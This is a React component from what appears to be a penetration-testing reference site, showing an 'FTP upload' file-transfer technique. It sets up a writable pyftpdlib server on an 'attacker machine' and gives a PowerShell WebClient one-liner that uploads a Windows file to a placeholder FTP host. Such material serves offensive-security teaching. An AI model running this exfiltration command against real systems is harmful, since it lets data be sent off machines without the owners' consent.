import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_FTP_Upload = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              We can use PowerShell or the FTP client to upload files to an FTP server.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Linux
              </Typography>
              <Typography>
              Using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attacker machine.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'sudo python3 -m pyftpdlib --port 21 --write'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
              Step 2 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"(New-Object Net.WebClient).UploadFile('ftp://{IP}/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_FTP_Upload;
  